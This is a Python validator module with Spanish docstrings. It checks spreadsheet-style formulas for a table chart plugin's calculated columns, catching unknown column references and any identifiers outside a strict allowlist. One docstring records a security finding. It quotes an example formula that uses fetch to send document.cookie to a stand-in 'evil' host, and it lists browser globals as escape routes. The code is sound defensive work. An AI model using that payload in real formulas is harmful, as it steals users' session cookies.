# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# "License"); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
"""Núcleo puro de `irex.validate_calculated_column_formula` — verifica una
fórmula de `calculated_columns` de `plugin-chart-tableV3` ANTES de
proponerla (PLAN_COPILOTO_EXPLORE.md, Fase 6, ampliación 2026-09-25 a
pedido del usuario: "en la tableV3 puedo usar jinja en varias opciones...
necesito que el LLM pueda verlos e interactuar").

**No es SQL** — `irex.validate_expression` no sirve para esto: el
lenguaje de fórmulas de `calculated_columns` se compila y evalúa en el
NAVEGADOR (`custom-plugins/plugin-chart-tableV3/src/utils/
calculatedColumns.ts::compileFormulaEvaluator`, vía `new Function(...)`),
nunca contra la base. Este módulo NO reimplementa ese compilador — sería
duplicar lógica real con riesgo de divergencia (el patrón que este
proyecto evita en general). En cambio, verifica lo que SÍ se puede
verificar sin un runtime de JS y que cubre la falla más común y más
peligrosa: una referencia `{{Columna}}` a un nombre que no existe. Esa
falla, en el compilador real, NO tira un error visible — `catch { return
null }` en dos niveles hace que la fórmula quede silenciosamente en blanco
en todas las filas, sin aviso. Por eso esta verificación previa importa
más acá que en un caso SQL (que sí falla ruidosamente al ejecutar).

Extrae las MISMAS referencias que reconoce el compilador real (mismos
patrones, portados de `calculatedColumns.ts`, con las mismas prioridades
de reemplazo) y las compara contra los nombres disponibles en el gráfico
(columnas agrupadas + etiquetas de métricas + calculated_columns ya
definidas). También marca identificadores en mayúsculas fuera de `{{}}`
que no son ninguna de las funciones seguras conocidas (`IF`, `OR`, `AND`,
etc.) — la otra forma común de que una fórmula quede rota en silencio.

Alcance: solo `calculated_columns` de `table_v3`. `metricFormulas` de
`pivot_table_rx1` usa su propio `parseFormulaMetrics` (no se confirmó que
sea el mismo compilador) — no se extiende a ese plugin todavía."""

from __future__ import annotations

import re
from collections.abc import Mapping, Sequence
from typing import Any

# Portados literalmente de calculatedColumns.ts (mismos patrones, mismo
# orden de aplicación) — re.ASCII para que \b/\w se comporten como en JS
# (que es ASCII-only), no como el default Unicode de Python.
_SCOPED_BRACE_RE = re.compile(r"\b(total|col|row)\.\{\{\s*([^}]+?)\s*\}\}", re.ASCII)
_SCOPED_BARE_RE = re.compile(r"\b(total|col|row)\.(\w+)\b", re.ASCII)
_COLUMN_REF_RE = re.compile(r"\{\{\s*([^}]+?)\s*\}\}")
# Cualquier identificador estilo JS, no solo ALL-CAPS -- ver
# extract_unknown_function_tokens (hallazgo de seguridad 2026-09-29).
_IDENTIFIER_RE = re.compile(r"\b[A-Za-z_][A-Za-z0-9_]*", re.ASCII)

# Mismo mapa que FUNCTION_ALIASES en calculatedColumns.ts — TRUE/FALSE/
# NULL/NAN cuentan como conocidos aunque no sean funciones (se traducen a
# literales JS, no a llamadas).
KNOWN_FUNCTION_ALIASES = frozenset(
    {"IF", "OR", "AND", "NOT", "ISBLANK", "ABS", "ROUND", "MAX", "MIN", "TRUE", "FALSE", "NULL", "NAN"}
)


def _mask_spans(text: str, spans: Sequence[tuple[int, int]]) -> str:
    """Reemplaza los tramos ya consumidos por espacios — misma longitud,
    así los offsets de los matches siguientes no se corren, y un espacio
    nunca es un carácter \\w que pueda arrastrar un match nuevo."""
    if not spans:
        return text
    chars = list(text)
    for start, end in spans:
        for i in range(start, end):
            chars[i] = " "
    return "".join(chars)


def extract_calculated_column_references(expression: str) -> list[str]:
    """Todas las referencias `{{Nombre}}` / `scope.{{Nombre}}` /
    `scope.Nombre` de la fórmula, en el mismo orden de prioridad que usa
    el compilador real (`buildJsExpression`, pasos 1-3): primero
    `scope.{{Nombre}}`, después `scope.Nombre` sin llaves, y por último
    `{{Nombre}}` simple — cada paso "consume" lo que ya resolvió para que
    el siguiente no lo vuelva a contar."""
    scoped_brace_matches = list(_SCOPED_BRACE_RE.finditer(expression))
    names = [m.group(2).strip() for m in scoped_brace_matches]
    remaining = _mask_spans(expression, [m.span() for m in scoped_brace_matches])

    scoped_bare_matches = list(_SCOPED_BARE_RE.finditer(remaining))
    names += [m.group(2) for m in scoped_bare_matches]
    remaining = _mask_spans(remaining, [m.span() for m in scoped_bare_matches])

    plain_matches = list(_COLUMN_REF_RE.finditer(remaining))
    names += [m.group(1).strip() for m in plain_matches]

    return names


def _mask_string_literals(text: str) -> str:
    """Reemplaza el CONTENIDO de literales de string ('...'/"...") por
    espacios (misma longitud, respeta escapes con \\) — así un identificador
    que solo aparece DENTRO de un string (ej. "hello" en
    IF({{x}}='hello world', 1, 0)) no se confunde con código real."""
    chars = list(text)
    i, n = 0, len(chars)
    while i < n:
        if chars[i] in ("'", '"'):
            quote = chars[i]
            j = i + 1
            while j < n and chars[j] != quote:
                if chars[j] == "\\" and j + 1 < n:
                    chars[j] = chars[j + 1] = " "
                    j += 2
                    continue
                chars[j] = " "
                j += 1
            i = j + 1 if j < n else j
            continue
        i += 1
    return "".join(chars)


def extract_unknown_function_tokens(
    expression: str, known_names: Sequence[str] | None = None
) -> list[str]:
    """Identificadores fuera de cualquier `{{...}}` (los dos estilos, con y
    sin llaves) y fuera de literales de string, que no son ninguna de las
    funciones/literales seguros conocidos (KNOWN_FUNCTION_ALIASES).

    Hasta 2026-09-29 esto solo miraba identificadores TODO EN MAYÚSCULA
    (`_FUNCTION_ALIAS_RE` original) — pero el compilador real
    (`FUNCTION_ALIAS_REGEX` en calculatedColumns.ts) también SOLO traduce
    nombres ALL-CAPS y deja pasar intacto CUALQUIER otro identificador
    (`fetch`, `document`, `window`, `eval`, `constructor`, o incluso un
    `total`/`row` suelto sin `.`) hasta `new Function(...)`, que no aísla
    del scope global del navegador. Hallazgo de seguridad 2026-09-29:
    `(1, fetch('https://evil/steal?c='+document.cookie))` no tiene ninguna
    palabra en mayúsculas y compilaba/ejecutaba sin error — este validador
    lo daba por `valid: true`. Por eso ahora se exige allowlist ESTRICTA:
    CUALQUIER identificador que sobreviva el enmascarado de referencias/
    strings y no esté en KNOWN_FUNCTION_ALIASES (comparación exacta,
    sensible a mayúsculas, igual que el compilador real) se reporta como no
    reconocido. La corrección real y definitiva está en el compilador del
    navegador (`calculatedColumns.ts::findDisallowedIdentifier`, mismo
    hallazgo) — este validador es una segunda barrera para que el modelo
    reciba `valid:false` con motivo en vez de una fórmula que compila
    "vacía" (o, antes de este fix, que compilaba y corría de verdad).

    `known_names` (opcional) replica una asimetría real del compilador: un
    `scope.{{Nombre}}` (CON llaves) SIEMPRE se sustituye por un getter,
    resuelva o no -- pero un `scope.Nombre` SIN llaves (`SCOPED_BARE_REGEX`
    en calculatedColumns.ts) solo se sustituye SI `Nombre` es una columna/
    métrica real (`if (!key) return match;` deja el texto ORIGINAL intacto
    si no). Sin este parámetro (o con una fórmula sin `scope.Nombre` sin
    llaves), el comportamiento no cambia -- pero si SÍ hay un `scope.Nombre`
    que no resuelve (ej. `total.constructor`), enmascararlo incondicional-
    mente escondería el propio `total`/`col`/`row` del escaneo de abajo."""
    known_lower = {name.lower() for name in (known_names or ())}

    scoped_brace_matches = list(_SCOPED_BRACE_RE.finditer(expression))
    remaining = _mask_spans(expression, [m.span() for m in scoped_brace_matches])

    scoped_bare_matches = list(_SCOPED_BARE_RE.finditer(remaining))
    resolvable_spans = [m.span() for m in scoped_bare_matches if m.group(2).lower() in known_lower]
    remaining = _mask_spans(remaining, resolvable_spans)

    plain_matches = list(_COLUMN_REF_RE.finditer(remaining))
    remaining = _mask_spans(remaining, [m.span() for m in plain_matches])
    remaining = _mask_string_literals(remaining)

    tokens = [m.group(0) for m in _IDENTIFIER_RE.finditer(remaining)]
    seen: list[str] = []
    for token in tokens:
        if token not in KNOWN_FUNCTION_ALIASES and token not in seen:
            seen.append(token)
    return seen


def _resolve_case_insensitive(name: str, known_lower: Mapping[str, str]) -> str | None:
    return known_lower.get(name.lower())


def known_calculated_column_names(form_data: Mapping[str, Any]) -> list[str]:
    """Nombres disponibles para una fórmula de `calculated_columns` en
    ESTE gráfico — las columnas agrupadas y las etiquetas de las métricas
    ya configuradas, más las de otras `calculated_columns` ya definidas
    (una fórmula puede referenciar una calculada anterior, igual que hace
    `applyCalculatedColumns` del lado real)."""
    names: list[str] = []

    def add_column_like(entry: Any) -> None:
        if isinstance(entry, str) and entry:
            names.append(entry)
        elif isinstance(entry, Mapping):
            label = entry.get("label")
            if isinstance(label, str) and label:
                names.append(label)

    for column in form_data.get("groupby") or []:
        add_column_like(column)
    for metric in form_data.get("metrics") or []:
        add_column_like(metric)
    for calc in form_data.get("calculated_columns") or []:
        if isinstance(calc, Mapping):
            label = calc.get("label")
            if isinstance(label, str) and label:
                names.append(label)

    return names


_TOTAL_SCOPE_RE = re.compile(r"\btotal\.", re.ASCII)

_SHOW_TOTALS_WARNING = (
    "La fórmula usa el alcance total.{{...}}, pero el gráfico no tiene show_totals activo. Sin él, "
    "TableChart.tsx nunca calcula la fila de total (enrichedTotal queda null) y total.{{...}} resuelve "
    "SIEMPRE a nulo — ISBLANK(total.{{...}}) da true en todas las filas, así que cualquier rama que dependa "
    "de eso (ej. IF(OR(ISBLANK(...), ...), 0, ...)) devuelve SIEMPRE el mismo resultado, nunca el cálculo "
    "real. Si la fórmula necesita total.{{...}}, agregar también {\"op\": \"set\", \"control\": \"show_totals\", "
    "\"value\": true} a la misma propuesta — sin eso, aplicar la fórmula sola no sirve de nada aunque sea "
    "estructuralmente válida."
)


def uses_total_scope(expression: str) -> bool:
    """Si la fórmula referencia el alcance `total.` (`total.{{Columna}}` o
    `total.Columna`) — ambas formas empiezan igual, un solo patrón las
    cubre. Se usa para decidir si corresponde el aviso sobre `show_totals`
    (ver `_SHOW_TOTALS_WARNING`) — encontrado en vivo (2026-09-28,
    sesión real): una fórmula bien formada con `total.{{Sell In}}`
    "no funcionó" porque el gráfico no tenía `show_totals` activo, y
    `irex.validate_calculated_column_formula` la había dado por válida
    sin advertir nada — la estructura SÍ era válida, lo que faltaba era
    esta dependencia de otro control, invisible mirando solo la fórmula."""
    return bool(_TOTAL_SCOPE_RE.search(expression))


def formula_validation_result(
    expression: str,
    known_names: Sequence[str],
    *,
    show_totals_enabled: bool = True,
) -> dict[str, Any]:
    """Resultado estructurado — nunca ejecuta la fórmula, solo revisa
    referencias y balance de símbolos. `valid=True` NO garantiza que la
    fórmula calcule lo que se pretende (eso solo se ve en el navegador,
    con datos reales) — solo que las referencias existen y la estructura
    superficial (llaves/paréntesis balanceados, sin tokens de función
    desconocidos) es sana.

    `warnings` es independiente de `valid`: una fórmula puede ser
    estructuralmente válida y aun así no funcionar por una dependencia de
    OTRO control que la fórmula sola no puede mostrar — hoy solo cubre
    `total.{{...}}` sin `show_totals` (ver `uses_total_scope`), el único
    caso encontrado en vivo hasta ahora. `show_totals_enabled` lo pasa el
    llamador leyendo el form_data YA verificado (nunca lo que diga el
    modelo) — default `True` para no romper a quien llame esta función sin
    pasarlo."""
    trimmed = expression.strip()
    if not trimmed:
        return {"valid": False, "error": "La expresión está vacía."}

    warnings: list[str] = []
    if uses_total_scope(trimmed) and not show_totals_enabled:
        warnings.append(_SHOW_TOTALS_WARNING)

    if trimmed.count("{{") != trimmed.count("}}"):
        return {"valid": False, "error": "Las llaves {{ }} no están balanceadas.", "warnings": warnings}
    if trimmed.count("(") != trimmed.count(")"):
        return {"valid": False, "error": "Los paréntesis no están balanceados.", "warnings": warnings}

    known_lower = {name.lower(): name for name in known_names}
    references = extract_calculated_column_references(trimmed)
    resolved: list[str] = []
    unknown: list[str] = []
    for ref in references:
        match = _resolve_case_insensitive(ref, known_lower)
        if match is not None:
            if match not in resolved:
                resolved.append(match)
        elif ref not in unknown:
            unknown.append(ref)

    unknown_functions = extract_unknown_function_tokens(trimmed, known_names)

    if unknown or unknown_functions:
        error_parts: list[str] = []
        if unknown:
            error_parts.append(f"columnas/métricas no encontradas: {', '.join(unknown)}")
        if unknown_functions:
            error_parts.append(f"identificadores/funciones no reconocidos: {', '.join(unknown_functions)}")
        return {
            "valid": False,
            "error": "La fórmula referencia " + "; ".join(error_parts) + ".",
            "unknown_references": unknown,
            "unknown_functions": unknown_functions,
            "resolved_references": resolved,
            "warnings": warnings,
        }

    return {"valid": True, "resolved_references": resolved, "warnings": warnings}
